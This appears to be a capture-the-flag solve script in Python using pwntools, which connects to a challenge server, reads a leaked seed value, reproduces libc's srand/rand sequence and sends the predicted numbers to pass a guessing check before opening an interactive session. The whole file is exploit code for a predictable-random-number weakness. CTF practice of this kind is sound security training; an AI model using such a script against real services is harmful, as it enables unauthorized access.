#!/usr/bin/python3
from ctypes import *
from pwn import *

libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
target = remote("pwn.ctf.secso.cc", 5002)
#target = remote("127.0.0.1", 9999)

target.recvuntil(": ")
target.sendline("a b")
target.recvuntil(": ")
leak = int(target.recv(8), base=16)

print(hex(leak))

libc.srand(leak)

for i in range(5):
	inp = str(libc.rand() % 10) + " " + str(libc.rand() % 10)
	target.sendline(inp)

target.interactive()
